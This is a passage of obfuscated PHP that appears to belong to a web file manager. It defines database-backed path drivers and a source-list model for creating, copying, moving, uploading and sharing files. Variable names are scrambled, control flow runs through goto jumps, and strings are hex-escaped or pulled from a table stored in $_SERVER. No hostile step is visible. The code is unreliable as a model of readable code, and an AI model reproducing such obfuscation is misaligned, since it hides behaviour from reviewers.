$CîÀËĞâìâ[$Fí©ö®’Ş][$FëÑãÚŞ•[472]] == 0) { return !1; } $F“à‘ Ê± = array($FëÑãÚŞ•[1667] => $Fí©ö®’Ş); goto AÒİË¸²©Å; CÍ¶£ö¢Õ¢: $b¼Ì„Şìˆè = !empty($c™Ş™Å©›[$Fí©ö®’Ş]) ? $c™Ş™Å©›[$Fí©ö®’Ş] : !1; if ($b¼Ì„Şìˆè) { goto aŠéèòïÇ; aŠéèòïÇ: if (!$c™Ş™Å©›[$eŞ¯©É«÷]) { $c™Ş™Å©›[$eŞ¯©É«÷] = Model($FëÑãÚŞ•[770])->groupRootAdd($eŞ¯©É«÷); } $f»†íğâ¦‰ = $c™Ş™Å©›[$eŞ¯©É«÷]; $F“à‘ Ê± = array($FëÑãÚŞ•[472] => $b¼Ì„Şìˆè); goto e‡ÊØè…³˜; D»¹•ÜŠ: foreach ($c™Ş™Å©› as $f°®±Ğ²Ç½) { $e¯¬‰ëáÇõ = $f°®±Ğ²Ç½[$FëÑãÚŞ•[397]] == $FëÑãÚŞ•[86] ? REPEAT_RENAME_FOLDER : REPEAT_RENAME; Model($FëÑãÚŞ•[770])->move($f°®±Ğ²Ç½[$FëÑãÚŞ•[390]], $f»†íğâ¦‰, $e¯¬‰ëáÇõ); } Model($FëÑãÚŞ•[770])->moveClearAuth = !0; $F“à‘ Ê± = array($FëÑãÚŞ•[398] => 2, $FëÑãÚŞ•[478] => $Fí©ö®’Ş); goto B°è­“Û¼; e‡ÊØè…³˜: $c™Ş™Å©› = Model($FëÑãÚŞ•[770])->where($F“à‘ Ê±)->field($FëÑãÚŞ•[1765])->select(); if (!$c™Ş™Å©›) { $c™Ş™Å©› = array(); } Model($FëÑãÚŞ•[770])->moveClearAuth = !1; goto D»¹•ÜŠ; B°è­“Û¼: $dùµ„„Âæ‰ = array($FëÑãÚŞ•[478] => $eŞ¯©É«÷); Model($FëÑãÚŞ•[1766])->where($F“à‘ Ê±)->save($dùµ„„Âæ‰); Model($FëÑãÚŞ•[1767])->where($F“à‘ Ê±)->save($dùµ„„Âæ‰); goto C‹ÁÇµ’ÌÌ; C‹ÁÇµ’ÌÌ: } $this->_changeChildLevel($CîÀËĞâìâ[$Fí©ö®’Ş], $CîÀËĞâìâ[$eŞ¯©É«÷], !0); goto cöƒ‹»‘Õ®; Bğ ¢˜ëù±: $FëÑãÚŞ• =& $_SERVER[¹…ÕÄ]; $F“à‘ Ê± = array($FëÑãÚŞ•[1667] => array($FëÑãÚŞ•[7], array($Fí©ö®’Ş, $eŞ¯©É«÷))); $CîÀËĞâìâ = $this->where($F“à‘ Ê±)->select(); goto BË¶ÆÀ‡ä; Câ–èÌ½Ë×: } } goto båª±ÙÛŒ; eµ´„ï»ŠË: class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($b˜ÊŒ¼…½ø) { $this->pathParse = $b˜ÊŒ¼…½ø; $this->model = Model($_SERVER[¹…ÕÄ][1183]); } public function getPath($dÒãÔ¤“¥) { return trim($dÒãÔ¤“¥, $_SERVER[¹…ÕÄ][8]); } public function pathFather($b»ŠÆ±·­†) { $dÉã“Ëä ‘ = $this->parse($b»ŠÆ±·­†); $dÉã“Ëä ‘ = $this->infoSimple($b»ŠÆ±·­†); return $dÉã“Ëä ‘ ? $dÉã“Ëä ‘[$_SERVER[¹…ÕÄ][472]] : !1; } public function pathThis($eÁõó‘÷•ä) { $fÛ–·ù«•Ä = $this->infoSimple($eÁõó‘÷•ä); return $fÛ–·ù«•Ä ? $fÛ–·ù«•Ä[$_SERVER[¹…ÕÄ][28]] : !1; } public function getPathOuter($c”Îó½‚) { if (!$c”Îó½‚) { return $c”Îó½‚; } $eñòØÓÖƒ = $this->parse($c”Îó½‚); return KodIO::make($eñòØÓÖƒ[$_SERVER[¹…ÕÄ][388]]); } public function copyFolderFromIO($EÊÜ ¦±‰, $E¯«—ÙÆä, $Cï°à÷ÆÌ, $EÜÅÀ»¢­ë, $C®ÖìÍ‰ß) { $C‹§—Æ¬— = $this->model->copyFolderFromIO($EÊÜ ¦±‰, $E¯«—ÙÆä, $Cï°à÷ÆÌ, $EÜÅÀ»¢­ë, $C®ÖìÍ‰ß); return KodIO::make($C‹§—Æ¬—); } public function isParentOf($Fë²Ê¯««µ, $aåµ¯ê±–Æ) { return $this->model->isParentOf($Fë²Ê¯««µ, $aåµ¯ê±–Æ); } public function mkfile($CÚ©Õ¡°™à, $e¢ø®±êÙğ = '', $aÅ×¯„¿ŒÂ = REPEAT_RENAME) { $e’Œ©†İ°² =& $_SERVER[¹…ÕÄ]; $eäéŒ×–ÒË = $this->parse($CÚ©Õ¡°™à); $CÚ©Õ¡°™à = $eäéŒ×–ÒË[$e’Œ©†İ°²[388]]; for ($EÉˆ‰¢ß„Å = 0; $EÉˆ‰¢ß„Å < count($eäéŒ×–ÒË[$e’Œ©†İ°²[1184]]); $EÉˆ‰¢ß„Å++) { $DµçéÙÖÌ = $eäéŒ×–ÒË[$e’Œ©†İ°²[1184]][$EÉˆ‰¢ß„Å]; if ($EÉˆ‰¢ß„Å == count($eäéŒ×–ÒË[$e’Œ©†İ°²[1184]]) - 1) { $CÚ©Õ¡°™à = $this->model->mkfile($CÚ©Õ¡°™à, $DµçéÙÖÌ, $e¢ø®±êÙğ, $aÅ×¯„¿ŒÂ); break; } $CÚ©Õ¡°™à = $this->model->mkdir($CÚ©Õ¡°™à, $DµçéÙÖÌ, REPEAT_SKIP); } return $this->getPathOuter($CÚ©Õ¡°™à); } public function mkdir($A´šÖ®öš, $c¥º¤§ÔñÌ = REPEAT_SKIP) { $C½¼‰¯¤… =& $_SERVER[¹…ÕÄ]; $C¾šÃëÎò = $this->parse($A´šÖ®öš); $A´šÖ®öš = $C¾šÃëÎò[$C½¼‰¯¤…[388]]; for ($Bì¥òö¸— = 0; $Bì¥òö¸— < count($C¾šÃëÎò[$C½¼‰¯¤…[1184]]); $Bì¥òö¸—++) { $AÇôª‹ØïŠ = $C¾šÃëÎò[$C½¼‰¯¤…[1184]][$Bì¥òö¸—]; $A´šÖ®öš = $this->model->mkdir($A´šÖ®öš, $AÇôª‹ØïŠ, $c¥º¤§ÔñÌ); } return $this->getPathOuter($A´šÖ®öš); } public function copyFile($AìïíÂº™, $fŞÅºø•É, $A»å¸„ŒøÇ = REPEAT_REPLACE) { $cÎ¿µÑ»šà =& $_SERVER[¹…ÕÄ]; $bÂ®ïÀ¹ñİ = $this->parse($fŞÅºø•É); $f§ÁÊïÀšÅ = $this->model->copy($AìïíÂº™, $bÂ®ïÀ¹ñİ[$cÎ¿µÑ»šà[388]], $A»å¸„ŒøÇ, $bÂ®ïÀ¹ñİ[$cÎ¿µÑ»šà[75]]); return $f§ÁÊïÀšÅ ? $this->getPathOuter($f§ÁÊïÀšÅ) : !1; } public function moveFile($BË†êØ÷Ø—, $dµ—ïÌñ¯É, $FçÁ­¬‘ö¹ = REPEAT_REPLACE) { $e´¨êÕĞ© =& $_SERVER[¹…ÕÄ]; $D­‚‚­äŠİ = $this->parse($dµ—ïÌñ¯É); $bÓàÚî‡¹§ = $this->model->move($BË†êØ÷Ø—, $D­‚‚­äŠİ[$e´¨êÕĞ©[388]], $FçÁ­¬‘ö¹, $D­‚‚­äŠİ[$e´¨êÕĞ©[75]]); return $bÓàÚî‡¹§ ? $this->getPathOuter($bÓàÚî‡¹§) : !1; } public function copy($FØ‚§×¦Åƒ, $DĞÅè“ Ä¾, $aãµÆíÇª = REPEAT_REPLACE) { $FêîµŒÛí = $this->parse($DĞÅè“ Ä¾); $E­‰°¦èÍà = $this->model->copy($FØ‚§×¦Åƒ, $FêîµŒÛí[$_SERVER[¹…ÕÄ][388]], $aãµÆíÇª); return $E­‰°¦èÍà ? $this->getPathOuter($E­‰°¦èÍà) : !1; } public function moveSameAllow() { } public function move($E…õ…âÚ‹, $A¡´±ªöõ¹, $EŠø™ˆ¡¢« = REPEAT_REPLACE) { $DÚÃÂù¸²° = $this->parse($A¡´±ªöõ¹); $E¬º…ÓÌ¤ = $this->model->move($E…õ…âÚ‹, $DÚÃÂù¸²°[$_SERVER[¹…ÕÄ][388]], $EŠø™ˆ¡¢«); return $E¬º…ÓÌ¤ ? $this->getPathOuter($E¬º…ÓÌ¤) : !1; } public function remove($B¨ŠŸĞ«Øƒ, $dˆÌÁÒ¤Î» = true) { return $this->model->remove($B¨ŠŸĞ«Øƒ, $dˆÌÁÒ¤Î»); } public function rename($AšÁ²”«…¿, $f„ºß°£ëë) { $a‹ğ©Îå®± = $this->model->rename($AšÁ²”«…¿, $f„ºß°£ëë); return $a‹ğ©Îå®± ? $this->getPathOuter($AšÁ²”«…¿) : $a‹ğ©Îå®±; } public function size($cê¦“­íïÉ) { $cÏ¤°öô®ˆ = $this->infoSimple($cê¦“­íïÉ); return $cÏ¤°öô®ˆ ? $cÏ¤°öô®ˆ[$_SERVER[¹…ÕÄ][77]] : 0; } public function infoSimple($b“Ú«ÑÛÇ²) { return $this->model->sourceInfo($b“Ú«ÑÛÇ²); } public function info($Fœ™ÕôÕ†È) { return $this->infoParse($Fœ™ÕôÕ†È); } public function infoAuth($E¥¦ñªáÓ™) { return $this->infoParse($E¥¦ñªáÓ™, !1, !0); } public function infoWithChildren($Dƒìò’Š’Õ) { return $this->infoParse($Dƒìò’Š’Õ, !0); } protected function infoParse($béŠá—êÙÀ, $aœ÷Îƒ³“« = false, $CÇô£¥‘à¤ = false) { if (!$aœ÷Îƒ³“«) { return $this->model->pathInfo($béŠá—êÙÀ, $CÇô£¥‘à¤); } return $this->model->pathInfoMore($béŠá—êÙÀ); } public function infoFull($Cõ°ÓÄË†Ô) { $F…‹—Áùß¯ =& $_SERVER[¹…ÕÄ]; $aÁëÂïÃ× = explode($F…‹—Áùß¯[8], $Cõ°ÓÄË†Ô); $cÃÅñØô“ = implode($F…‹—Áùß¯[8], array_splice($aÁëÂïÃ×, 1)); return $this->model->pathInfoByPath($aÁëÂïÃ×[0], $cÃÅñØô“); } public function hashSimple($b¦§‰“Ü¶í) { $D©ê·¦·éÀ =& $_SERVER[¹…ÕÄ]; $còº™À³ÓÑ = $this->infoWithChildren($b¦§‰“Ü¶í); return $còº™À³ÓÑ[$D©ê·¦·éÀ[163]][$D©ê·¦·éÀ[170]]; } public function hashMd5($dÉµ£¹¯) { $Fù¡‚Î´›Ü =& $_SERVER[¹…ÕÄ]; $bì‚‰ªÒ»“ = $this->infoWithChildren($dÉµ£¹¯); return $bì‚‰ªÒ»“[$Fù¡‚Î´›Ü[163]][$Fù¡‚Î´›Ü[169]]; } public function exist($cºŞ“Òİã¥) { $B›ŸŸ‹Ã§¡ =& $_SERVER[¹…ÕÄ]; $d¼øÓ¥§¯· = $this->parse($cºŞ“Òİã¥); if (!$d¼øÓ¥§¯·[$B›ŸŸ‹Ã§¡[75]]) { return $this->isFile($cºŞ“Òİã¥) || $this->isFolder($cºŞ“Òİã¥); } $fŒï§ İŒ = array($B›ŸŸ‹Ã§¡[389] => $d¼øÓ¥§¯·[$B›ŸŸ‹Ã§¡[388]], $B›ŸŸ‹Ã§¡[28] => $d¼øÓ¥§¯·[$B›ŸŸ‹Ã§¡[75]]); $bèõ³òÅç© = $this->model->where($fŒï§ İŒ)->find(); return $bèõ³òÅç© ? !0 : !1; } public function isFile($C«É«ì¶ãÜ) { $EÌˆì¿ÙÁŠ =& $_SERVER[¹…ÕÄ]; $c†ø¥è¥÷Ş = $this->infoSimple($C«É«ì¶ãÜ); return $c†ø¥è¥÷Ş && $c†ø¥è¥÷Ş[$EÌˆì¿ÙÁŠ[397]] == $EÌˆì¿ÙÁŠ[86] ? !1 : !0; } public function isFolder($Cçé¿ŸíÊ’) { $Bˆ¾ÛçÍÔó =& $_SERVER[¹…ÕÄ]; $B¢È¡¨éÌ = $this->infoSimple($Cçé¿ŸíÊ’); return $B¢È¡¨éÌ && $B¢È¡¨éÌ[$Bˆ¾ÛçÍÔó[397]] == $Bˆ¾ÛçÍÔó[86] ? !0 : !1; } public function listPath($DÕ¿š¸Â‹, $cÛŸÔŞ“¡¢ = false) { $E¾íÛ¾È˜ñ =& $_SERVER[¹…ÕÄ]; if ($DÕ¿š¸Â‹ == $E¾íÛ¾È˜ñ[33]) { return !1; } $A›ô±Ğçâœ = array($E¾íÛ¾È˜ñ[389] => $DÕ¿š¸Â‹); if ($cÛŸÔŞ“¡¢) { return $this->model->listSource($A›ô±Ğçâœ, -1); } return $this->model->listSource($A›ô±Ğçâœ); } public function has($b‚ìì®•Şá, $aµ‚‘åø· = false, $aŞ¼ÙŞœ´Û = null) { $fŸ®ôØÍÅÆ =& $_SERVER[¹…ÕÄ]; $Aô•®ÛÍ = $this->infoWithChildren($b‚ìì®•Şá); if ($aµ‚‘åø·) { return array($fŸ®ôØÍÅÆ[202] => $Aô•®ÛÍ[$fŸ®ôØÍÅÆ[202]], $fŸ®ôØÍÅÆ[201] => $Aô•®ÛÍ[$fŸ®ôØÍÅÆ[201]]); } return $aŞ¼ÙŞœ´Û ? $Aô•®ÛÍ[$fŸ®ôØÍÅÆ[202]] : $Aô•®ÛÍ[$fŸ®ôØÍÅÆ[201]]; } public function listAll($A¢™­„·²) { $DÙ¹Ø˜Š¯ = IO::info($this->pathParse[$_SERVER[¹…ÕÄ][75]]); if (!$DÙ¹Ø˜Š¯) { return array(); } return $this->model->listAll($A¢™­„·²); } public function getContent($fö³—ìÏ“Œ) { return $this->model->getContent($fö³—ìÏ“Œ); } public function setContent($CÆâ¸ô³ç, $e¢œö¤ñÊÒ = '') { return $this->model->setContent($CÆâ¸ô³ç, $e¢œö¤ñÊÒ); } public function fileSubstr($B£½óÜé£ğ, $eæœÒ²Ö©á, $D˜ö³­·Å¥) { return $this->model->fileSubstr($B£½óÜé£ğ, $eæœÒ²Ö©á, $D˜ö³­·Å¥); } public function download($a‘˜äÃê›ò, $e·Ü¶Ô›à® = '') { $FÈ˜ˆ„Êõù = get_path_father($e·Ü¶Ô›à®); $cù‚ò³Ò£ = get_path_this($e·Ü¶Ô›à®); $EÄŒÊÕØ = $this->model->fileInfoGet($a‘˜äÃê›ò); $AÄØ“†Ì¦ò = IO::copy($EÄŒÊÕØ[$_SERVER[¹…ÕÄ][75]], $FÈ˜ˆ„Êõù, !1, $cù‚ò³Ò£); return $AÄØ“†Ì¦ò; } public function setModifyTime($B•¨í×ù‘°, $D…ö†‡óÚ = '') { $this->model->metaSet($B•¨í×ù‘°, $_SERVER[¹…ÕÄ][1185], $D…ö†‡óÚ); } public function upload($fèÍà÷çß, $FŒ„£ÉŠ›, $d˜Ï ­ëå = false, $b¢½Æö’‹ = REPEAT_REPLACE) { $a…ÖÉ””Ìë =& $_SERVER[¹…ÕÄ]; $BîÂöÓÃ« = $this->parse($fèÍà÷çß); $e¢×’ôİ“ = $this->model->addFile($BîÂöÓÃ«[$a…ÖÉ””Ìë[388]], $FŒ„£ÉŠ›, $BîÂöÓÃ«[$a…ÖÉ””Ìë[75]], $d˜Ï ­ëå, $b¢½Æö’‹); return $this->getPathOuter($e¢×’ôİ“); } public function uploadFileByID($DŞêó’•Å¡, $Fê ç’œ—Œ, $Aå‡„·®‘) { $C–´á²†Ä‚ =& $_SERVER[¹…ÕÄ]; $B•¡Ş¨ñ† = $this->parse($DŞêó’•Å¡); $e¸ÏÚŞ¥„é = $this->model->addFileByFileID($B•¡Ş¨ñ†[$C–´á²†Ä‚[388]], $Fê ç’œ—Œ, $B•¡Ş¨ñ†[$C–´á²†Ä‚[75]], $Aå‡„·®‘); return $this->getPathOuter($e¸ÏÚŞ¥„é); } public function addFileByRemote($CÊµØª¤´è, $CóŠÑø§ª, $FĞ¯„­ïŠİ = array(), $F¼®µ®èùí = '', $EêÖÙá©î™) { $F»õÄùá£¦ =& $_SERVER[¹…ÕÄ]; $f„óĞŠ¯› = $this->parse($CÊµØª¤´è); $F¼®µ®èùí = empty($F¼®µ®èùí) ? $f„óĞŠ¯›[$F»õÄùá£¦[75]] : $F¼®µ®èùí; $f»ƒ²Çó– = $this->model->addFileByRemote($f„óĞŠ¯›[$F»õÄùá£¦[388]], $CóŠÑø§ª, $F¼®µ®èùí, $FĞ¯„­ïŠİ, $EêÖÙá©î™); return $this->getPathOuter($f»ƒ²Çó–); } public function uploadLink($f·ìÊ‰‘Í, $EÓ®î¯¥„ = 0) { $e¥ñĞÆÆö† =& $_SERVER[¹…ÕÄ]; $aˆ¸˜Ì£“‘ = $this->parse($f·ìÊ‰‘Í); $f·ìÊ‰‘Í = Model($e¥ñĞÆÆö†[566])->createFileName($aˆ¸˜Ì£“‘[$e¥ñĞÆÆö†[75]]); $C©ÄøÌƒ¿ø = IO::uploadLink($f·ìÊ‰‘Í, $EÓ®î¯¥„); return $C©ÄøÌƒ¿ø; } public function fileNameAuto($EÓ»ËÈÃœÊ, $DÉ ñë‚Ö, $cÄÇË¼è¦ = REPEAT_REPLACE, $FñğÒåŠ = false) { return $this->model->fileNameAuto($EÓ»ËÈÃœÊ, $DÉ ñë‚Ö, $cÄÇË¼è¦, $FñğÒåŠ); } public function fileNameExist($Dî”Ç­ĞÔ, $EËí¢†®¨) { return $this->model->fileNameExist($Dî”Ç­ĞÔ, $EËí¢†®¨); } protected function _fileOut($cèÛ±¶ÓòŒ, $dç÷ÎÓ = false, $DÕˆ„ò•„ = false, $eĞîåéöô = '', $dµª…ÊòÄ = false) { goto b’œ®Œ‰îŒ; dÌèÆ’Œœ: $EÓÊ¥äÑŞ— = $this->model->fileInfoGet($cèÛ±¶ÓòŒ); $eĞîåéöô = $EÓÊ¥äÑŞ—[$bÃù±ÌÛğ±[169]] ? $EÓÊ¥äÑŞ—[$bÃù±ÌÛğ±[169]] : $eĞîåéöô; $aŠŠŠÃŞ† = isset($GLOBALS[$bÃù±ÌÛğ±[1187]]) ? $GLOBALS[$bÃù±ÌÛğ±[1187]] : $eºÏ·®–ê[$bÃù±ÌÛğ±[28]]; goto bªÎËö°„‹; bªÎËö°„‹: if ($dµª…ÊòÄ) { return IO::fileOutServer($EÓÊ¥äÑŞ—[$bÃù±ÌÛğ±[75]], $dç÷ÎÓ, $aŠŠŠÃŞ†, $eĞîåéöô); } IO::fileOut($EÓÊ¥äÑŞ—[$bÃù±ÌÛğ±[75]], $dç÷ÎÓ, $aŠŠŠÃŞ†, $eĞîåéöô); goto fÎèÛ‰ôÅ; b’œ®Œ‰îŒ: $bÃù±ÌÛğ± =& $_SERVER[¹…ÕÄ]; $eºÏ·®–ê = $this->model->sourceInfo($cèÛ±¶ÓòŒ); if ($eºÏ·®–ê[$bÃù±ÌÛğ±[397]] == $bÃù±ÌÛğ±[86]) { header($bÃù±ÌÛğ±[1186]); die; } goto dÌèÆ’Œœ; fÎèÛ‰ôÅ: } public function fileOut($E¯ÇÂÁ‰Ñ, $EÄ÷„Ÿİòâ = false, $eÙ«ÈôÅ = false, $bµ•ĞÇäè = '') { $this->_fileOut($E¯ÇÂÁ‰Ñ, $EÄ÷„Ÿİòâ, $eÙ«ÈôÅ, $bµ•ĞÇäè); } public function fileOutServer($eŸ½’ó‘ğÄ, $D÷ÏÆ‰Ü‘Ñ = false, $DäöŒÖÖ¥‚ = false, $a¥ÇÔÕ­÷Ë = '') { $this->_fileOut($eŸ½’ó‘ğÄ, $D÷ÏÆ‰Ü‘Ñ, $DäöŒÖÖ¥‚, $a¥ÇÔÕ­÷Ë, !0); } protected function _fileOutImage($fËŒ•òõ›ç, $Bßçß¤ª‰ = 250) { goto DŸ—¡Ã’•†; B ö­øçç—: $GLOBALS[$dÖˆòÊœŸ[1187]] = $a—åôëÒª[$dÖˆòÊœŸ[28]]; $GLOBALS[$dÖˆòÊœŸ[161]] = $a—åôëÒª; IO::fileOutImage($a—åôëÒª[$dÖˆòÊœŸ[75]], $Bßçß¤ª‰); goto cË¡ç ½; DŸ—¡Ã’•†: $dÖˆòÊœŸ =& $_SERVER[¹…ÕÄ]; $bÉº¿˜ = $this->model->pathInfo($fËŒ•òõ›ç); if ($bÉº¿˜[$dÖˆòÊœŸ[397]] == $dÖˆòÊœŸ[86]) { show_json($dÖˆòÊœŸ[1188] . $fËŒ•òõ›ç, !1); } goto cï°÷éôá±; cï°÷éôá±: $a—åôëÒª = $this->model->fileInfoGet($fËŒ•òõ›ç); $a—åôëÒª[$dÖˆòÊœŸ[28]] = $bÉº¿˜[$dÖˆòÊœŸ[28]]; $a—åôëÒª[$dÖˆòÊœŸ[162]] = $bÉº¿˜[$dÖˆòÊœŸ[162]]; goto B ö­øçç—; cË¡ç ½: } public function fileOutImage($bóë‹´§Œµ, $EÊíİÛµ× = 250) { $this->_fileOutImage($bóë‹´§Œµ, $EÊíİÛµ×); } public function fileOutImageServer($eÓÆ¹ß¿», $DÒÄ„ä…Äè = 250) { $this->_fileOutImage($eÓÆ¹ß¿», $DÒÄ„ä…Äè); } public function link($cØÀ¶ªŸ´–, $d£áÜãØùÃ = '') { $dí«Ù×Î¬§ = $this->model->fileInfoGet($cØÀ¶ªŸ´–); return IO::link($dí«Ù×Î¬§[$_SERVER[¹…ÕÄ][75]], $d£áÜãØùÃ); } protected function parse($f–ê¢‹¨˜ù) { $C®öÂ¹ßì½ =& $_SERVER[¹…ÕÄ]; if (strstr($f–ê¢‹¨˜ù, $C®öÂ¹ßì½[8]) === !1) { return array($C®öÂ¹ßì½[406] => intval($f–ê¢‹¨˜ù), $C®öÂ¹ßì½[75] => $C®öÂ¹ßì½[33], $C®öÂ¹ßì½[1184] => array()); } $F‹‚©ãË = explode($C®öÂ¹ßì½[8], trim($f–ê¢‹¨˜ù, $C®öÂ¹ßì½[8])); if (count($F‹‚©ãË) < 2) { show_tips($f–ê¢‹¨˜ù . $C®öÂ¹ßì½[1189]); } return array($C®öÂ¹ßì½[406] => intval($F‹‚©ãË[0]), $C®öÂ¹ßì½[75] => $F‹‚©ãË[1], $C®öÂ¹ßì½[1184] => array_slice($F‹‚©ãË, 1)); } } class PathDriverDbShareItem extends PathDriverDB { public function __construct($bÆ„²ÊˆÎÅ) { $this->pathParse = $bÆ„²ÊˆÎÅ; $this->model = Model($_SERVER[¹…ÕÄ][1183]); } public function getPathOuter($Bù½“ÒÕ¸ª) { $cŞ£Å•ò§ =& $_SERVER[¹…ÕÄ]; if (!$Bù½“ÒÕ¸ª) { return $Bù½“ÒÕ¸ª; } $F‘È™êí = $this->parse($Bù½“ÒÕ¸ª); return trim(KodIO::makeShare($this->pathParse[$cŞ£Å•ò§[388]], $F‘È™êí[$cŞ£Å•ò§[388]]), $cŞ£Å•ò§[8]); } protected function infoParse($DÉß’‰ø‚, $FäÃÈÍËØ¶ = false, $BƒŸñï•‡Å = false) { $fĞ‡‚Õ±Ö =& $_SERVER[¹…ÕÄ]; $E‹Èˆø±´Ó = $this->pathParse[$fĞ‡‚Õ±Ö[388]]; $côë¶‹Í = trim($this->pathParse[$fĞ‡‚Õ±Ö[1042]], $fĞ‡‚Õ±Ö[8]); return Action($fĞ‡‚Õ±Ö[1190])->sharePathInfo($E‹Èˆø±´Ó, $côë¶‹Í); } public function infoFull($a®ÛŒœµ) { $DŸËÜÂÜ¢ =& $_SERVER[¹…ÕÄ]; $a¬ÃÙ±¾‚ = explode($DŸËÜÂÜ¢[8], trim($a®ÛŒœµ, $DŸËÜÂÜ¢[8])); if (count($a¬ÃÙ±¾‚) > 1) { $bÕˆŠáñÃ­ = implode($DŸËÜÂÜ¢[8], array_splice($a¬ÃÙ±¾‚, 1)); $cæŒù™˜Œè = $this->model->pathInfoByPath($a¬ÃÙ±¾‚[0], $bÕˆŠáñÃ­); if (!$cæŒù™˜Œè) { return !1; } $this->pathParse[$DŸËÜÂÜ¢[1042]] = $cæŒù™˜Œè[$DŸËÜÂÜ¢[390]]; } return $this->infoParse($a®ÛŒœµ); } public function listAll($BÙ¥«—”„) { goto díÄ†Í¾¡÷; díÄ†Í¾¡÷: $EÇ‚°Œàà¬ =& $_SERVER[¹…ÕÄ]; $eğÉÚ”º¢ = IO::info($this->pathParse[$EÇ‚°Œàà¬[75]]); if (!$eğÉÚ”º¢) { return array(); } goto a»¤¶ç´†ä; B…îÃô¾Œ©: foreach ($AÉêÒÈˆéÕ as &$FãŸÏŒó‹Ô) { check_abort(); $FãŸÏŒó‹Ô[$EÇ‚°Œàà¬[84]] = $B„™‡‚ªñ‘->_shareItemeParse($FãŸÏŒó‹Ô[$EÇ‚°Œàà¬[84]], $aå¡ÈŞï); } unset($FãŸÏŒó‹Ô); return $AÉêÒÈˆéÕ; goto Aç›À´¥Õß; a»¤¶ç´†ä: $AÉêÒÈˆéÕ = $this->model->listAll($BÙ¥«—”„); $aå¡ÈŞï = Model($EÇ‚°Œàà¬[558])->getInfo($eğÉÚ”º¢[$EÇ‚°Œàà¬[462]]); $B„™‡‚ªñ‘ = Action($EÇ‚°Œàà¬[1190]); goto B…îÃô¾Œ©; Aç›À´¥Õß: } } class PathDriverDbShareLink extends PathDriverDB { public function __construct($aåÏïº­Ü¡) { $this->pathParse = $aåÏïº­Ü¡; $this->model = Model($_SERVER[¹…ÕÄ][1183]); } protected function infoParse($bÍß»ùï¸, $Bê·•íõ´ä = false, $e½ØÎçåÑ = false) { $D¶•¼ñÔê =& $_SERVER[¹…ÕÄ]; return Action($D¶•¼ñÔê[1048])->sharePathInfo($this->pathParse[$D¶•¼ñÔê[75]], !0); } public function listPath($aÖ‚¬ÑøÚ’, $EàÇ„øáº§ = false) { $c¬¹‘†Š£Ó =& $_SERVER[¹…ÕÄ]; $a¶¡å¡™ïğ = parent::listPath($aÖ‚¬ÑøÚ’, $EàÇ„øáº§); foreach ($a¶¡å¡™ïğ as $A™Ã–ÙÏ¬ => $aô†½Àì§) { if (!in_array($A™Ã–ÙÏ¬, array($c¬¹‘†Š£Ó[73], $c¬¹‘†Š£Ó[74]))) { continue; } foreach ($aô†½Àì§ as $cæÖØĞÃÛ => $C•„ºÍÌ«º) { $a¶¡å¡™ïğ[$A™Ã–ÙÏ¬][$cæÖØĞÃÛ] = Action($c¬¹‘†Š£Ó[1048])->shareItemInfo($C•„ºÍÌ«º); } } return $a¶¡å¡™ïğ; } public function listAll($AÃÙœ¬¹±ô) { goto DŒÜà­³óå; DŒÜà­³óå: $BŞ½âÛÀÌ‹ =& $_SERVER[¹…ÕÄ]; $f ä¹šïå¢ = IO::info($this->pathParse[$BŞ½âÛÀÌ‹[75]]); if (!$f ä¹šïå¢) { return array(); } goto fİ‘Ë±½; fİ‘Ë±½: $aÏöÏÏ³ƒ = $this->model->listAll($AÃÙœ¬¹±ô); foreach ($aÏöÏÏ³ƒ as &$Fƒ²ï¿«³×) { $Fƒ²ï¿«³×[$BŞ½âÛÀÌ‹[84]] = Action($BŞ½âÛÀÌ‹[1048])->shareItemInfo($Fƒ²ï¿«³×[$BŞ½âÛÀÌ‹[84]]); } unset($Fƒ²ï¿«³×); goto a‰Áîì‰À¨; a‰Áîì‰À¨: return $aÏöÏÏ³ƒ; goto eĞÎñøĞË ; eĞÎñøĞË : } } goto f¸áŞ¦Ü¤; Dñ³¯ïø²: class SourceListModel extends ModelBase { protected $tableName = "\x69\x6f\x5f\163\x6f\x75\x72\x63\x65"; protected $tableMeta = array("\x74\141\142\154\145\116\141\155\145" => "\x69\x6f\137\x73\x6f\x75\x72\143\145\137\155\x65\164\x61", "\155\145\x74\x61\106\151\x65\x6c\144" => "\163\157\165\x72\x63\x65\111\x44"); protected $dataAuto = array(array("\155\157\x64\151\x66\171\124\x69\x6d\x65", "\x74\x69\155\x65", "\151\156\x73\x65\162\164", "\x66\165\156\x63\164\x69\157\x6e"), array("\143\162\x65\141\164\145\x54\x69\155\145", "\x74\x69\x6d\x65", "\x69\156\163\145\x72\x74", "\x66\x75\x6e\143\164\151\x6f\156"), array("\166\x69\145\167\x54\151\155\145", "\164\151\x6d\145", "\151\x6e\x73\x65\162\x74", "\146\x75\x6e\143\x74\x69\x6f\x6e")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($dö†–ñâëÍ) { return $this->listSource(array($_SERVER[¹…ÕÄ][389] => $dö†–ñâëÍ)); } public function typeName($C”ºÅ­„ã®) { static $D˜ŸˆÕ™Î² = array(self::TYPE_SYSTEM => "\x73\x79\x73\x74\x65\x6d", self::TYPE_USER => "\165\x73\x65\162", self::TYPE_GROUP => "\x67\162\x6f\x75\160"); return $D˜ŸˆÕ™Î²[$C”ºÅ­„ã® . $_SERVER[¹…ÕÄ][33]]; } public function sourceListInfo($aäÁ¢ŸÛø, $aÌŒÂÖÈù = false) { goto B½àŠñªÚ; DîÙåØÓò²: if (!$aäÁ¢ŸÛø) { return array(); } $BéÖ‰î× = $this->where(array($Fµ¼”¿Ğ†[390] => array($Fµ¼”¿Ğ†[7], $aäÁ¢ŸÛø)))->select(); $this->_listDataApply($BéÖ‰î×, $aÌŒÂÖÈù); goto E½ÓçÍ¢£; B½àŠñªÚ: $Fµ¼”¿Ğ† =& $_SERVER[¹…ÕÄ]; $aäÁ¢ŸÛø = $aäÁ¢ŸÛø ? $aäÁ¢ŸÛø : array(); $aäÁ¢ŸÛø = array_filter(array_unique($aäÁ¢ŸÛø)); goto DîÙåØÓò²; E½ÓçÍ¢£: return array_to_keyvalue($BéÖ‰î×, $Fµ¼”¿Ğ†[390]); goto Fİ¦õÌª‚Ó; Fİ¦õÌª‚Ó: } public function pathInfoFilter(&$aøš¾Èœõ) { goto Bº’¥ìºİŞ; Bº’¥ìºİŞ: $FÉÑëÕÆÆ® =& $_SERVER[¹…ÕÄ]; static $E‘¦„·¿ºÔ = false; static $a¦¨ ¤’øÎ = 